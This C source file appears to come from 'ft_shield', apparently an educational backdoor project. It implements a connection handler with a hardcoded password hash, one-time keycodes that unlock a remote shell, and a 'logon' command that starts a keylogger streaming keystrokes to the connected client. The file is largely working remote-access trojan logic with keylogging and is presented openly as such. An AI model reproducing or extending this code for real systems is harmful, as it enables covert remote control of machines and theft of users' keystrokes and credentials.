#include "ft_shield.h"

bool	search_password(t_server *server, char *input)
{
	t_list	*lst = server->passwords;
	t_list	*prev = NULL;

	while (lst)
	{
		if (strcmp(lst->content, input) == 0)
		{
			if (prev == NULL)
				server->passwords = lst->next;
			else
				prev->next = lst->next;
			ft_dprintf(2, "password [%s] found and deleted\n", input);
			free(lst->content);
			free(lst);
			return (true);
		}
		prev = lst;
		lst = lst->next;
	}
	return (false);
}

bool	check_server_password(t_server *server, char *input)
{
	const char	*server_pass = "E4F47C78F4E89C24DC38907008A4284C";
	char		input_hash[33];

	(void)server;
	simple_deterministic_id((uint8_t *)input, strlen(input), input_hash);
	ft_dprintf(2, "input: [%s] hash: [%s]\n", input, input_hash);
	if (strcmp(server_pass, input_hash) == 0)
	{
		ft_dprintf(2, "password match\n");
		return (true);
	}
	return (false);
}

void	handle_handshake(t_server *server, int index, char *input) {
	t_client *const	client = &server->clients[index];

	if (client->status == HANDSHAKE)
	{
		ft_dprintf(2, "HANDSHAKE INPUT [%s]\n", input);
		if (search_password(server, input) == true)
		{
			shell_function(server, index);
			client->status = SHELL;
			return ;
		}
		if (check_server_password(server, input) == false)
		{
			ft_dprintf(2, "Invalid KEY\n");
			return ;
		}
		ft_dprintf(2, "Valid KEY\n");
		client->status = CONNECTED;
		add2buffer(&server->clients[index], ft_strdup("$> "));
	}
}

void	add_password(t_server *server, int index)
{
	char		*password = gen_random_password();
	t_list		*new_node = ft_lstnew(password);
	char		msg_connection[300] = {0};

	ft_lstadd_back(&server->passwords, new_node);
	sprintf(msg_connection, "To access the remote shell, use the next Keycode -> [%s]\n", password);
	add2buffer(&server->clients[index], ft_strdup(msg_connection));
}

void	delete_client(t_server *server, int index)
{
	t_client *client = &server->clients[index];

	close(client->fd);
	if (client->inpipe_fd && client->outpipe_fd) {
		close(client->inpipe_fd);
		close(client->outpipe_fd);
	}
	memset(&server->clients[index], 0, sizeof(t_client));
	server->nbr_clients--;
}

void	nstats(t_server *s, int index)
{
	char		msg[300] = {0};

	sprintf(msg, "Total inbytes: %ld\nTotal outbytes: %ld\nSession inbytes: %ld\nSession outbytes: %ld\n\n",
		s->total_inbytes, s->total_outbytes, s->clients[index].inbytes, s->clients[index].outbytes );
	add2buffer(&s->clients[index], ft_strdup(msg));
}

int	handle_commands(t_server *server, int index, char *input)
{
	t_client	*client = &server->clients[index];

	if (strcmp("clear", input) == 0)
	{
		add2buffer(&server->clients[index], ft_strdup(CLEAR_CODE));
	}
	else if (strcmp("shell", input) == 0)
	{
		ft_dprintf(2, "client_fd: %d\n", client->fd);
		add_password(server, index);
		client->disconnect = true;
		//delete_client(server, index);
	}
	else if (strcmp("logon", input) == 0)
	{
		client->status = KEYLOGGER;
		keylogger_function(server, index);
		return (0);
	}
	else if (strcmp("nstats", input) == 0)
	{
		nstats(server, index);
	}
	else if (strcmp("?", input) == 0 || strcmp("help", input) == 0)
	{
		add2buffer(&server->clients[index], ft_strdup(HELP));
	}
	add2buffer(client, ft_strdup("$> "));
	return (0);
}

int	handle_inpipe(t_server *server, int index, char *input)
{
	t_client	*client = &server->clients[index];
	//printf("trying to write inpipe, fdisset %i\n", FD_ISSET(client->inpipe_fd, &server->wfds));
	if (client->inpipe_fd && FD_ISSET(client->inpipe_fd, &server->wfds))
	{
		//printf("writing inpipe!\n");
		int r = write(client->inpipe_fd, input, strlen(input));
		if (r < 0) {
			close(client->inpipe_fd);
			client->inpipe_fd = 0;
			close(client->outpipe_fd);
			client->outpipe_fd = 0;
			client->status = CONNECTED;
			client->response_bffr = strdup("$> ");
		}
	}
	return 0;
}

int	extract_outpipe(t_server *server, int index)
{
	char buffer[4096];

	memset(buffer, 0, sizeof(buffer));
	int			r = 0;
	t_client	*client = &server->clients[index];
	//printf("trying to read outpipe %i, fdisset %i\n", client->outpipe_fd, FD_ISSET(client->outpipe_fd, &server->rfds));
	if (client->outpipe_fd && FD_ISSET(client->outpipe_fd, &server->rfds))
	{
		r = read(client->outpipe_fd, buffer, 4095);
		//printf("reading outpipe! (bytes: %i)\n", r);
		if (r == 0) {
			close(client->inpipe_fd);
			client->inpipe_fd = 0;
			close(client->outpipe_fd);
			client->outpipe_fd = 0;
			client->status = CONNECTED;
			client->response_bffr = strdup("$> ");
		}
		if (r > 0)
		{
			client->response_bffr = calloc(r + 1, 1);
			memcpy(client->response_bffr, buffer, r);
		}
		if (r < 0)
			client->response_bffr = ft_strdup("errooooor\n");
	}
	return r;
}

int	handle_input(t_server *server, int index, char *buffer)
{
	const t_client	*client = &server->clients[index];
	char			*input = ft_strtrim(buffer, TRIM_CHARS);
	int				fd;

	ft_dprintf(2, "readed: [%s]\n", input);
	if (client->status == HANDSHAKE)
		handle_handshake(server, index, input);
	else if (client->status == CONNECTED)
		fd = handle_commands(server, index, input);
	else if (client->status == SHELL || client->status == KEYLOGGER)
		fd = handle_inpipe(server, index, buffer);
	free(input);
	return (fd);
}
